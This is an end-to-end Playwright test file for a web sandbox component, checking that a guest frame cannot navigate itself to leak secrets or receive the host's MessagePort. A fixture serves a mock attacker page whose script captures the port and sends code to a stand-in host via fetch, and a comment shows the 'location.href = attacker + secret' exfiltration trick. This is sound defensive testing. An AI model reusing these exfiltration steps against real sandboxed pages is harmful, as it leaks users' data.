import type { BrowserContext } from '@playwright/test';
import { test, expect } from '../../../test/e2e/fixture';
import { useRecorder } from '../../../test/e2e/recorder';
import { fromPreset } from '../../../test/e2e/presets';

/**
 * Research 14: the guest frame navigating itself (backlog S10 / S11, issue #6 N1 + N2).
 *
 * No CSP directive governs where a document may navigate itself, and the sandbox flags only stop
 * *top-level* navigation. Before the fix, `location.href = attacker + secret` carried data out, and
 * the host then handed a fresh MessagePort (plus queued execute() code) to the attacker's page.
 */

const ATTACKER = 'http://attacker.test';

// Evidence for 14.1 (backlog T5): the refused navigation is reported to the wrapper, which runs no script,
// so no violation reaches the host. The evidence is a listener outside the browser that every vector
// targets, and the frames on the page (none may hold the target). Positive control per vector: the same
// markup in a sandboxed frame on the host page, without the wrapper, reaches the listener.
const recorder = useRecorder();

// Records every request that reaches the attacker origin, and serves a page that grabs any port it is sent.
async function watchAttacker(context: BrowserContext): Promise<string[]> {
    const reached: string[] = [];
    await context.route(`${ATTACKER}/**`, route => {
        reached.push(route.request().url());
        return route.fulfill({
            contentType: 'text/html',
            body: `<script>
                addEventListener('message', e => {
                    if (e.data?.type !== 'INIT_PORT') return;
                    const port = e.ports[0];
                    port.postMessage({ type: 'LOG', level: 'log', args: ['ATTACKER_GOT_PORT'] });
                    port.onmessage = m => fetch('${ATTACKER}/leak?code=' + encodeURIComponent(m.data.code), { mode: 'no-cors' });
                });
            </script>`,
        });
    });
    return reached;
}

// The vectors: the preset's code (location.href) and its variants (window.open _self, link click, meta refresh).
const preset = fromPreset('self-navigation');

for (const [name, vector] of preset.payloads) {
    test(`14.1 self-navigation via ${name === 'code' ? 'location.href' : name} does not reach the network`, async ({ sandbox, page }) => {
        await sandbox.mount(preset.rules);

        await sandbox.load(preset.aimedAt(recorder.blocked, vector));
        await page.waitForTimeout(2000); // the positive control below arrives well within this

        expect(recorder.paths('blocked'), 'the guest navigated itself to the listener').toEqual([]);
        expect(page.frames().map(f => f.url()).filter(url => url.startsWith(recorder.blocked))).toEqual([]);
    });

    test(`14.1 positive control: ${name === 'code' ? 'location.href' : name} from a sandboxed frame without the wrapper reaches the listener`, async ({ sandbox }) => {
        await sandbox.page.evaluate((markup) => {
            const frame = document.createElement('iframe');
            frame.setAttribute('sandbox', 'allow-scripts');
            frame.srcdoc = markup;
            document.body.appendChild(frame);
        }, preset.aimedAt(recorder.blocked, vector));
        await recorder.waitFor('blocked', '/?d=guest-secret', 2000);
    });
}

test('14.2 the host never hands a port to a second document in the frame', async ({ sandbox, context, page }) => {
    await watchAttacker(context);
    expect(await sandbox.mount()).toBe('ready');

    // Something replaces the document in the sandbox frame. The guest itself cannot reach the
    // host-owned frame any more, so simulate it from the host side.
    const outcome = await page.evaluate(() => new Promise<string>(resolve => {
        const s = document.querySelector('web-sandbox') as any;
        s.addEventListener('terminated', () => resolve('terminated'), { once: true });
        s.addEventListener('ready', () => resolve('ready-again'), { once: true });
        const frame = s.shadowRoot.querySelector('iframe') as HTMLIFrameElement;
        frame.srcdoc = '<p>a document the host did not write</p>';
        setTimeout(() => resolve('nothing'), 3000);
    }));

    expect(outcome).toBe('terminated');

    // queued or later code must not go anywhere
    await sandbox.run('console.log("after terminate")');
    await page.waitForTimeout(500);
    expect(await sandbox.logs()).not.toContain('after terminate');
    expect(await page.evaluate(() => (document.querySelector('web-sandbox') as any).shadowRoot.querySelector('iframe'))).toBeNull();
});
